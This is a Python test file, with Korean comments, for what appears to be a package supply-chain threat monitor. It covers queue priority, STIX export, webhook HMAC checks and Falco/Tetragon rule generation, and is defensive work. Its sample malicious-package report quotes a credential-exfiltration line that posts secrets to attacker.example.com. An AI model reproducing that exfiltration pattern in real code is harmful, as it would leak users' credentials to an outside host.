"""
실시간 모니터링 + sink 통합 테스트.

실 네트워크 호출(PyPI/npm) 없이, 직접 ReleaseEvent 를 큐에 넣고
worker 동작 + sink YAML/STIX/HMAC 출력만 검증.
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

# 격리 DB
TEST_DB_DIR = tempfile.mkdtemp(prefix="aislopsq_rt_")
TEST_DB_PATH = Path(TEST_DB_DIR) / "test.sqlcipher"
TEST_PASSPHRASE = "rt-test-passphrase"
os.environ["AISLOP_DB_KEY"] = TEST_PASSPHRASE

from pkgsentinel.db.threat_db import ThreatDB, reset_default_db
from pkgsentinel.monitor.priority_queue import PriorityQueue
from pkgsentinel.monitor.release_event import (
    ReleaseEvent,
    compute_priority,
)
from pkgsentinel.realtime.sinks.falco_policy import (
    FalcoPolicySink,
    to_falco_rules,
    to_tracing_policy,
)
from pkgsentinel.realtime.sinks.stix_sink import (
    STIXSink,
    to_stix_bundle,
    to_stix_json,
)
from pkgsentinel.realtime.sinks.webhook_sink import (
    hmac_sign,
    hmac_verify,
)


def _fresh_db() -> ThreatDB:
    if TEST_DB_PATH.exists():
        TEST_DB_PATH.unlink()
    reset_default_db()
    return ThreatDB(TEST_DB_PATH, passphrase=TEST_PASSPHRASE)


# ─────────────── priority ───────────────

def test_priority_buckets():
    print("== priority buckets ==")
    cases = [
        ({"rank": 5}, 10),     # top-10
        ({"rank": 50}, 30),    # top-100
        ({"rank": 500}, 60),   # top-1000
        ({"rank": 3000}, 90),  # top-5000
        ({"rank": 99999}, 200),
        ({}, 200),
        ({"rank": 5, "has_recent_advisory": True}, 0),  # top-10 + advisory, clamp >= 0
    ]
    ok = True
    for inp, expected in cases:
        got = compute_priority(**inp)
        mark = "OK  " if got == expected else "FAIL"
        if got != expected:
            ok = False
        print(f"  [{mark}] {inp} -> {got} (expected {expected})")
    return ok


# ─────────────── queue ───────────────

def test_queue_lock_complete():
    print("\n== queue lock + complete ==")
    db = _fresh_db()
    pq = PriorityQueue(db)

    pq.enqueue(ReleaseEvent("PyPI", "high-prio", "1.0",
                            archive_url="x", source_event="manual"),
               priority=10)
    pq.enqueue(ReleaseEvent("npm", "low-prio", "0.0.1",
                            archive_url="x", source_event="manual"),
               priority=200)

    # 가장 우선순위 높은 게 먼저 lock 되어야
    job = pq.lock_next()
    assert job is not None
    assert job.package == "high-prio", f"got {job.package}"
    print(f"  OK first locked: {job.package} (prio={job.priority})")

    pq.complete(job.id, result="OK")

    # 다음
    job2 = pq.lock_next()
    assert job2.package == "low-prio"
    print(f"  OK next locked: {job2.package}")

    pq.complete(job2.id, result="OK")
    stats = pq.stats()
    print(f"  stats: {stats}")
    assert stats["done"] == 2
    return True


def test_queue_priority_ordering():
    print("\n== queue priority ordering ==")
    db = _fresh_db()
    pq = PriorityQueue(db)

    # 순서 무관하게 enqueue
    pq.enqueue(ReleaseEvent("PyPI", "p200", "1", source_event="m"), priority=200)
    pq.enqueue(ReleaseEvent("PyPI", "p10",  "1", source_event="m"), priority=10)
    pq.enqueue(ReleaseEvent("PyPI", "p100", "1", source_event="m"), priority=100)

    order = []
    while True:
        j = pq.lock_next()
        if j is None:
            break
        order.append(j.package)
        pq.complete(j.id)

    print(f"  pop order: {order}")
    assert order == ["p10", "p100", "p200"], f"wrong order: {order}"
    return True


# ─────────────── STIX ───────────────

_SAMPLE_REPORT = {
    "verdict": "MALICIOUS",
    "package": "evil-pkg",
    "ecosystem": "PyPI",
    "version": "0.0.1",
    "evidence": [{
        "code_snippet": "requests.post('https://attacker.example.com', data=secret)",
        "ttp_id": "T1041",
        "ttp_url": "https://attack.mitre.org/techniques/T1041/",
        "llm_reasoning": "creds exfil",
        "confidence": 0.92,
    }],
    "package_meta": {"advisory_summary": "exfil to attacker.example.com"},
}


def test_stix_bundle_structure():
    print("\n== STIX 2.1 bundle structure ==")
    bundle = to_stix_bundle(_SAMPLE_REPORT)
    assert bundle["type"] == "bundle"
    assert bundle["id"].startswith("bundle--")
    types = [o["type"] for o in bundle["objects"]]
    print(f"  object types: {types}")
    # malicious 면 indicator + malware + software 등 모두 있어야
    assert "identity" in types
    assert "software" in types
    assert "indicator" in types
    assert "malware" in types     # MALICIOUS 라서
    assert "relationship" in types
    print("  OK contains all expected types")
    # JSON round-trip
    s = to_stix_json(_SAMPLE_REPORT)
    parsed = json.loads(s)
    assert parsed["objects"][2]["type"] == "indicator"
    return True


def test_stix_file_emit():
    print("\n== STIX file emit ==")
    out = tempfile.mkdtemp(prefix="stix_")
    sink = STIXSink(out_dir=out)
    r = sink.emit(_SAMPLE_REPORT)
    assert "file" in r
    assert os.path.exists(r["file"])
    print(f"  OK file written: {os.path.basename(r['file'])} "
          f"sha={r['sha256'][:12]}..")
    import shutil
    shutil.rmtree(out, ignore_errors=True)
    return True


# ─────────────── Webhook HMAC ───────────────

def test_hmac_sign_verify():
    print("\n== Webhook HMAC ==")
    secret = "rt-test-secret"
    body = b'{"verdict":"MALICIOUS"}'
    ts = int(time.time() * 1000)
    sig = hmac_sign(secret, ts, body)

    # correct
    assert hmac_verify(secret, ts, body, f"sha256={sig}")
    print("  OK correct verify")

    # wrong secret
    assert not hmac_verify("WRONG", ts, body, f"sha256={sig}")
    print("  OK wrong secret rejected")

    # tampered body
    assert not hmac_verify(secret, ts, body + b"x", f"sha256={sig}")
    print("  OK tampered body rejected")

    # replay (1 hour old)
    old = ts - 3600 * 1000
    old_sig = hmac_sign(secret, old, body)
    assert not hmac_verify(secret, old, body, f"sha256={old_sig}")
    print("  OK replay rejected")

    return True


# ─────────────── Falco ───────────────

def test_falco_rules_yaml():
    print("\n== Falco rules YAML ==")
    yml = to_falco_rules(_SAMPLE_REPORT)
    print("  excerpt:")
    for line in yml.splitlines()[:8]:
        print(f"    {line}")
    assert "attacker.example.com" in yml, "domain not in rule"
    assert "AISLOPSQ Outbound" in yml, "rule name missing"
    assert "tags: [aislopsq, supply-chain, network]" in yml
    print("  OK domain rule generated")
    return True


def test_tetragon_policy_yaml():
    print("\n== Tetragon TracingPolicy YAML ==")
    yml = to_tracing_policy(_SAMPLE_REPORT)
    assert "kind: TracingPolicy" in yml
    assert "Sigkill" in yml
    assert "attacker.example.com" in yml
    print("  excerpt:")
    for line in yml.splitlines()[:10]:
        print(f"    {line}")
    print("  OK tetragon policy with sigkill")
    return True


def test_falco_sink_writes_files():
    print("\n== Falco sink writes both YAML files ==")
    out = tempfile.mkdtemp(prefix="falco_")
    sink = FalcoPolicySink(out_dir=out)
    r = sink.emit(_SAMPLE_REPORT)
    assert "falco" in r and "tetragon" in r
    assert os.path.exists(r["falco"]), r
    assert os.path.exists(r["tetragon"]), r
    print(f"  OK falco={os.path.basename(r['falco'])}")
    print(f"     tetragon={os.path.basename(r['tetragon'])}")
    import shutil
    shutil.rmtree(out, ignore_errors=True)
    return True


# ─────────────── main ───────────────

def main():
    tests = [
        test_priority_buckets,
        test_queue_lock_complete,
        test_queue_priority_ordering,
        test_stix_bundle_structure,
        test_stix_file_emit,
        test_hmac_sign_verify,
        test_falco_rules_yaml,
        test_tetragon_policy_yaml,
        test_falco_sink_writes_files,
    ]
    failed = 0
    for t in tests:
        try:
            ok = t()
            if not ok:
                failed += 1
        except Exception:
            import traceback
            traceback.print_exc()
            failed += 1

    print("\n" + "=" * 50)
    print(f"PASSED: {len(tests) - failed}/{len(tests)}")
    if failed:
        print(f"FAILED: {failed}")
    else:
        print("ALL OK")

    import shutil
    shutil.rmtree(TEST_DB_DIR, ignore_errors=True)
    sys.exit(failed)


if __name__ == "__main__":
    main()
